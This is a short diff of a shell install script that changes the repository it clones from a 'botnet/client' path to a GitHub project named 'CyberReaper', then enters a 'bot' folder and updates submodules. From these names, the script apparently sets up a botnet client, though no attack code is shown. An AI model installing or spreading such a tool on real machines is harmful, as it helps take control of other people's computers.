@@ -16,7 +16,7 @@ elif [[ ${NAME} =~ "Fedora" ]]; then
 fi
 
 # Clone the sources
-git clone https://gitlab.pyhead.net/botnet/client ${WORKDIR}
+git clone https://github.com/E-Gideon/CyberReaper.git ${WORKDIR}
 pushd bot
 git submodule update --init --recursive
 
